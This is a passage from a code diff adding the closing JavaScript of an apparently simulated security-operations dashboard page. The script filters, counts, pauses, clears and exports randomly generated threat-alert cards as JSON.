+    triage.innerHTML += `<br><span style="color:var(--red);font-weight:700">⚡ SOAR TRIGGERED:</span> ${action}`;
+  }
+}
+
+// ── Triage toggle ──
+function toggleTriage(id) {
+  const panel = document.getElementById(`triage-${id}`);
+  if (panel) panel.classList.toggle('open');
+}
+
+// ── Filter ──
+function setFilter(f, btn) {
+  activeFilter = f;
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  applyFilter();
+  updateVisibleCount();
+}
+
+function filterFeed() {
+  searchQuery = document.getElementById('search').value.toLowerCase();
+  applyFilter();
+  updateVisibleCount();
+}
+
+function applyFilter() {
+  cards.forEach(({sev, el, id}) => {
+    const sevMatch = activeFilter === 'ALL' || sev === activeFilter;
+    const textMatch = !searchQuery || el.dataset.text.includes(searchQuery);
+    el.style.display = (sevMatch && textMatch) ? '' : 'none';
+  });
+}
+
+function updateVisibleCount() {
+  const visible = cards.filter(({el}) => el.style.display !== 'none').length;
+  document.getElementById('visible-count').textContent = `${visible} visible`;
+}
+
+// ── KPIs ──
+function updateKPIs() {
+  document.getElementById('cnt-crit').textContent  = counts.CRITICAL;
+  document.getElementById('cnt-high').textContent  = counts.HIGH;
+  document.getElementById('cnt-med').textContent   = counts.MEDIUM;
+  document.getElementById('cnt-low').textContent   = counts.LOW;
+  document.getElementById('cnt-acked').textContent = counts.acked;
+  document.getElementById('cnt-soar').textContent  = counts.soar;
+}
+
+// ── Pause ──
+function togglePause() {
+  paused = !paused;
+  document.getElementById('pause-btn').textContent = paused ? '▶ Resume' : '⏸ Pause';
+}
+
+// ── Clear ──
+function clearFeed() {
+  document.getElementById('feed').innerHTML = '';
+  cards = [];
+  counts = { CRITICAL:0, HIGH:0, MEDIUM:0, LOW:0, acked:0, soar:0 };
+  updateKPIs();
+  updateVisibleCount();
+}
+
+// ── Export ──
+function exportFeed() {
+  const data = cards.map(({sev, el}) => ({
+    severity: sev,
+    title: el.querySelector('.threat-title')?.textContent,
+    module: el.querySelector('.threat-module')?.textContent,
+    asset: el.querySelector('.threat-asset')?.textContent,
+    technique: el.querySelector('.threat-attck')?.textContent,
+    time: el.querySelector('.threat-time')?.textContent,
+    acknowledged: el.classList.contains('acked'),
+  }));
+  const blob = new Blob([JSON.stringify(data, null, 2)], {type:'application/json'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `s313-threats-${new Date().toISOString().slice(0,19).replace(/:/g,'-')}.json`;
+  a.click();
+}
+
+// ── Start feed — randomized intervals, no looping ──
+function scheduleNext() {
+  // Vary interval: CRITICAL events come faster
+  const base = 2000 + Math.random() * 3000;
+  setTimeout(() => { addEvent(); scheduleNext(); }, base);
+}
+
+// Seed with a few initial events
+for (let i = 0; i < 5; i++) {
+  setTimeout(() => addEvent(), i * 400);
+}
+scheduleNext();
+</script>
+</body>
+</html>
